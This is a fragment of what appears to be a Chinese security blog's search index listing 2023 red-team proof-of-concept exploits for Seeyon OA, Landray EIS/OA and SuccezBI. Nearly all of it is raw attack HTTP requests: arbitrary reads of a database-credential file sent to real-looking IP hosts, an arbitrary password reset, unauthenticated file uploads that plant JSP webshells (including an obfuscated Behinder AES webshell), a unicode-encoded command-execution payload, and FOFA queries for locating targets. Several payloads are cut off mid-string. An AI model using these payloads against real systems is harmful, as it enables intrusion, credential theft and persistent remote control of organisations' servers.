","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-oa-wpsassistservlet-%E6%96%87%E4%BB%B6-templateurl-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"致远互联-OA wpsAssistServlet 文件 templateUrl 参数任意文件读取漏洞","uri":"/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-oa-wpsassistservlet-%E6%96%87%E4%BB%B6-templateurl-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /seeyon/wpsAssistServlet HTTP/1.1 Host: 101.78.10.115:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 56 flag=template\u0026templateUrl=C%253A%252Fwindows%252Fwin.ini ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-oa-wpsassistservlet-%E6%96%87%E4%BB%B6-templateurl-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"致远互联-OA wpsAssistServlet 文件 templateUrl 参数任意文件读取漏洞","uri":"/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-oa-wpsassistservlet-%E6%96%87%E4%BB%B6-templateurl-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"后利用 POST /seeyon/wpsAssistServlet HTTP/1.1 Host: 124.71.228.217:8088 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 71 flag=template\u0026templateUrl=/Seeyon/A8/base/conf/datasourceCtp.properties ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-oa-wpsassistservlet-%E6%96%87%E4%BB%B6-templateurl-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"致远互联-OA wpsAssistServlet 文件 templateUrl 参数任意文件读取漏洞","uri":"/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94-oa-wpsassistservlet-%E6%96%87%E4%BB%B6-templateurl-%E5%8F%82%E6%95%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1 Host: ip:port User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/json Accept-Encoding: gzip {“loginName”:“XXX321123XXX”,”password”:“123456”} ","date":"2023-12-08","objectID":"/%E8%87%B4%E8%BF%9C%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/:0:0","tags":["2023hw"],"title":"致远任意密码重置","uri":"/%E8%87%B4%E8%BF%9C%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["2023hw"],"content":"## poc\rPOST /eis/service/api.aspx?action=saveImg HTTP/1.1 Host: xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Content-Length: 219 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysG3y2koDU2TcfA0W Upgrade-Insecure-Requests: 1 ------WebKitFormBoundarysG3y2koDU2TcfA0W Content-Disposition: form-data; name=\"file\"filename=\"hp01rxysup.asp\" Content-Type: text/html \u003c% response.write(\"hello world\")%\u003e ------WebKitFormBoundarysG3y2koDU2TcfA0W-- ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8C-eis-8.0-saveimg-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"蓝凌 eis 8.0 saveImg 前台任意文件上传","uri":"/%E8%93%9D%E5%87%8C-eis-8.0-saveimg-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"蓝凌EIS智慧协同平台saveImg接口存在任意文件上传漏洞 ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Ceis%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0saveimg%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"蓝凌EIS智慧协同平台saveImg接口存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Ceis%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0saveimg%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa icon_hash=\"953405444\" ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Ceis%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0saveimg%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"蓝凌EIS智慧协同平台saveImg接口存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Ceis%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0saveimg%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC POST /eis/service/api.aspx?action=saveImg HTTP/1.1 Host: IP:PORT User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Content-Length: 197 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu ------WebKitFormBoundaryxdgaqmqu Content-Disposition: form-data; name=\"file\"filename=\"hello.txt\" Content-Type: text/html hellohello ------WebKitFormBoundaryxdgaqmqu-- ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Ceis%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0saveimg%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"蓝凌EIS智慧协同平台saveImg接口存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Ceis%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0saveimg%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: zh-CN,zh;q=0.9 Content-type: Content-Length: 2444 DBSTEP V3.0 141 0 5860 DBSTEP=REJTVEVQ OPTION=U0FWRUFTSFRNTA== HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL2RlbW9kZW1vLnR4dA== RECORDID= DIRECTORY= 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 例如 冰蝎3 密码1的请求体 DBSTEP V3.0 121 0 1924 DBSTEP=REJTVEVQ OPTION=U0FWRUFTSFRNTA== HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL2RlbW9kZW1vNi5qc3A= DIRECTORY= \u003c%! public byte[] A9wY2(String Strings,String k) throws Exception { javax.crypto.Cipher B437D3 = javax.crypto.Cipher.getInstance(“AES/ECB/PKCS5Padding”);B437D3.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(“javax.crypto.spec.SecretKeySpec”).getConstructor(byte[].class, String.class).newInstance(k.getBytes(), “AES”));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = “\";for (int i = 0; i \u003c aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod(“getDecoder”).invoke(null);bytes = (byte[]) decoder.getClass().getMethod(“decode”, String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = “\";for (int i = 0; i \u003c aa.length; i++) {aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod(“decodeBuffer”, String","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coa-jg_service-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"蓝凌OA jg_service 任意文件上传","uri":"/%E8%93%9D%E5%87%8Coa-jg_service-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"蓝凌OA treexml.tmpl 远程命令执行漏洞 ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"蓝凌OA treexml.tmpl 远程命令执行漏洞","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"Landray-OA系统\" ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"蓝凌OA treexml.tmpl 远程命令执行漏洞","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp POST /data/sys-common/treexml.tmpl HTTP/1.1 Host: Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 RunGo: dir Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Content-Length: 0 s_bean=ruleFormulaValidate\u0026script=\\u0062\\u006f\\u006f\\u006c\\u0065\\u0061\\u006e\\u0020\\u0066\\u006c\\u0061\\u0067\\u0020\\u003d\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u0020\\u003d\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0047\\u0072\\u006f\\u0075\\u0070\\u0028\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0072\\u0065\\u0066\\u006c\\u0065\\u0063\\u0074\\u002e\\u0046\\u0069\\u0065\\u006c\\u0064\\u0020\\u0066\\u0020\\u003d\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u0020\\u003d\\u0020\\u0028\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u005b\\u005d\\u0029\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0067\\u0072\\u006f\\u0075\\u0070\\u0029\\u003b\\u0066\\u006f\\u0072\\u0020\\u0028\\u0069\\u006e\\u0074\\u0020\\u0069\\u0020\\u003d\\u0020\\u0030\\u003b\\u0020\\u0069\\u0020\\u003c\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u003b\\u0020\\u0069\\u002b\\u002b\\u0029\\u0020\\u007b\\u0020\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0020\\u0074\\u0020\\u003d\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\u0073\\u005b\\u0069\\u005d\\u003b\\u0069\\u0066\\u0020\\u0028\\u0074\\u0020\\u003d\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0073\\u0074\\u0072\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0028\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0065\\u0078\\u0065\\u0063\\u0022\\u0029\\u0020\\u007c\\u007c\\u0020\\u0021\\u0073\\u0074\\u0072\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0068\\u0074\\u0074\\u0070\\u0022\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u0074\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0061\\u0072\\u0067\\u0065\\u0074\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0074\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0021\\u0028\\u006f\\u0062\\u006a\\u0020\\u0069\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u006f\\u0066\\u0020\\u0052\\u0075\\u006e\\u006e\\u0061\\u0062\\u006c\\u0065\\u0029\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0074\\u0","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"蓝凌OA treexml.tmpl 远程命令执行漏洞","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 执行POC，执行dir命令，回显目录 ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"蓝凌OA treexml.tmpl 远程命令执行漏洞","uri":"/%E8%93%9D%E5%87%8Coa-treexml.tmpl-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"fofa\r","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coa-zip%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"蓝凌oa zip上传","uri":"/%E8%93%9D%E5%87%8Coa-zip%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"poc POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo\u0026s_ajax=true HTTP/1.1 X-Real-IP: X-Forwarded-For: Host: X-Forwarded-Proto: https X-B3-TraceId: a22c34f91eb9bd9e1326b3cc54aa23e9 X-B3-SpanId: a22c34f91eb9bd9e1326b3cc54aa23e9 Content-Length: 731 Content-Type: multipart/form-data; boundary=********************1692085217190 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4 Accept-Encoding: gzip, deflate Cache-Control: no-cache Pragma: no-cache Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 -********************1692085217190 Content-Disposition: form-data; name=\"file\"; filename=\"data.zip\" Content-Type: application/x-zip-compressed PK --********************1692085217190-- 2. GET /resource/ui-component/themes/logs.jsp HTTP/1.1 ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coa-zip%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"蓝凌oa zip上传","uri":"/%E8%93%9D%E5%87%8Coa-zip%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"蓝凌OAsysUiComponent 文件存在任意文件上传漏洞 ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"蓝凌OAsysUiComponent 文件存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"Landray-OA系统\" ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"蓝凌OAsysUiComponent 文件存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc 直接访问路径，发现未授权文件上传 http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo\u0026s_ajax=true HTTP/1.1 Host: IP:PORT User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Referer: http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload Content-Length: 474 Content-Type: multipart/form-data; boundary=---------------------------15610248407689 Cookie: SESSION=YmI0OGMyZDQtZDE0NC00MTQ2LWJmMzMtNWE5NDMwOTYxM2Ex DNT: 1 Connection: close -----------------------------15610248407689 Content-Disposition: form-data; name=\"file\"; filename=\"test.zip\" Content-Type: application/x-zip-compressed PKx3;x4;x14; -----------------------------15610248407689 ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"蓝凌OAsysUiComponent 文件存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 创建component.ini文件，内容为： id=2023 name=check.txt 创建上传check.txt文件 1111 然后使用压缩软件，将两个文件压缩成一个压缩包，文件名check.zip 最后上传即可。上传成功后访问路径/resource/ui-component/2023/check.txt ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"蓝凌OAsysUiComponent 文件存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞来源 https://mp.weixin.qq.com/s/xhwmFuItG8ZoiuGrwR5bnw ","date":"2023-12-08","objectID":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw漏洞"],"title":"蓝凌OAsysUiComponent 文件存在任意文件上传漏洞","uri":"/%E8%93%9D%E5%87%8Coasysuicomponent-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /succezbi/sz/commons/form/file/uploadChunkFile?guid=../tomcat/webapps/ROOT/\u0026chunk=ss.jsp HTTP/1.1 Host: 10.168.4.99:808 Content-Length: 49564 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=—-WebKitFormBoundary8GeAY18LCxR7XnVP User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=7351EFC189410384FF702A41106FF4A2 Connection: close ——WebKitFormBoundary8GeAY18LCxR7XnVP Content-Disposition: form-data; name=“file”; filename=“ww” Content-Type: image/jpeg webshell ——WebKitFormBoundary8GeAY18LCxR7XnVP Content-Disposition: form-data; name=“tijiao” confirm ——WebKitFormBoundary8GeAY18LCxR7XnVP– webshell：http://xxx/ww_ss.jsp ","date":"2023-12-08","objectID":"/%E8%B5%9B%E6%80%9D-succezbi-uploadchunkfile-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"赛思 SuccezBI uploadChunkFile 